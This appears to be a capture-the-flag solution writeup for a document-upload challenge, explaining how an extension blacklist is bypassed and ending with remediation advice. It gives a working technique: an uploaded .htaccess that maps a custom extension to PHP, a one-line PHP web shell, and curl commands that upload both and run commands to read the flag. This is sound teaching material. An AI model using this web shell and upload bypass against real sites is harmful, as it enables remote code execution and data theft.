# PaperTrail — Solution & Writeup

> Spoilers ahead. This is the intended path to the flag, plus the reasoning
> that leads there and the fixes that would close the hole.

**Flag:** `Securinets{wh3n_.htacc3ss_1s_upl04d4bl3_1ts_g4m3_0v3r}`

---

## 1. Recon

PaperTrail is a document portal with an upload form that accepts PDF / DOCX /
TXT / MD. Poke at what the uploader actually enforces:

- **Try a PHP file.** Upload `test.php` — rejected with *"That file type is not
  supported."* So there is an extension filter.
- **Try a renamed document.** Upload `notes.txt` with arbitrary bytes — it is
  accepted. There is no content / MIME / magic-byte check; the filename is all
  that matters.
- **Fetch what you uploaded.** Files are stored under their original name at
  `/uploads/<name>` and served straight back. `notes.txt` downloads as plain
  text — nothing executes.

Enumerate the filter by trying variants: `php`, `php5`, `phtml`, `phar`,
`pht`, `phps`, `pl`, `py`, `sh`, `asp`, `jsp`, ... all rejected. It is a
**blacklist** of known-executable extensions.

Two facts fall out of recon:

1. Every scriptable extension you can think of is blocked, **but only the ones
   on the list**. An invented extension like `.ptx` sails through, and so does
   a file literally named `.htaccess`.
2. The server runs `.php` and nothing else. Uploading `shell.ptx` on its own
   just gives you a static download — the bytes are never interpreted.

So the blacklist stops the obvious `.php` shell, and the default handler stops
any other extension from running. We need to change what the server *runs*.

## 2. The insight: upload the config that grants execution

This is a stock `php:8.2-apache` box (mod_php), and the `uploads/` directory is
served with `AllowOverride All`. That means an `.htaccess` file dropped into
`uploads/` is honoured by Apache. And `.htaccess` is not on the blacklist.

Apache's `AddHandler` (or `SetHandler` / `AddType`) can map an arbitrary
extension to the PHP engine. Map our made-up extension:

```apache
AddHandler application/x-httpd-php .ptx
```

Now any `.ptx` file in `uploads/` will be executed as PHP. Step 2 (the shell)
is impossible without step 1 (this remap): before the `.htaccess` exists,
`.ptx` is just a download.

## 3. Exploit

Two uploads, then one request.

**a) Upload the `.htaccess`** (contents above). It saves to `uploads/.htaccess`.

**b) Upload the shell** as `shell.ptx`:

```php
<?php system($_GET['c'] ?? 'id'); ?>
```

**c) Run commands** — the remap now makes `.ptx` execute:

```bash
curl 'http://localhost:8080/uploads/shell.ptx?c=id'
curl 'http://localhost:8080/uploads/shell.ptx?c=cat+/flag.txt'
```

The second request returns:

```
Securinets{wh3n_.htacc3ss_1s_upl04d4bl3_1ts_g4m3_0v3r}
```

### Doing it with curl end to end

```bash
# .htaccess
curl -F 'document=@.htaccess;filename=.htaccess' -F 'tag=Misc' \
     http://localhost:8080/api/upload.php

# shell
printf '<?php system($_GET["c"] ?? "id"); ?>' > shell.ptx
curl -F 'document=@shell.ptx;filename=shell.ptx' -F 'tag=Misc' \
     http://localhost:8080/api/upload.php

# flag
curl 'http://localhost:8080/uploads/shell.ptx?c=cat+/flag.txt'
```

`make_exploit.sh http://localhost:8080` automates exactly this.

## 4. Why each guard fails

| Guard in place | Why it does not help |
|---|---|
| Extension blacklist | Enumerates *bad* extensions; misses `.htaccess` and any unlisted extension. A blacklist is only as complete as its author's imagination. |
| "Documents only" UI | Cosmetic. The server never checks content or MIME — only the filename's extension. |
| Default handler is `.php` only | True, but the attacker supplies their own handler mapping via `.htaccess`. |

## 5. Remediation

- **Whitelist, don't blacklist.** Accept only an explicit set of extensions
  (`pdf`, `docx`, `txt`, `md`) and reject everything else, including
  `.htaccess` and dotfiles.
- **Validate content, not just the name.** Check MIME / magic bytes against the
  claimed type; reject mismatches.
- **Kill execution in upload directories.** `php_admin_flag engine off`, and set
  `AllowOverride None` so an uploaded `.htaccess` is ignored. Better still, drop
  a handler-clearing config: `RemoveHandler`, `SetHandler none`.
- **Store uploads outside the web root** and stream them through a download
  script — never let the web server execute anything a user placed on disk.
- **Randomise stored filenames** (e.g. a UUID) and keep the display name only in
  metadata, so attackers cannot predict or control the path or extension.
- **Least privilege:** the app user should not be able to read `/flag.txt` — or
  any secret — in the first place.
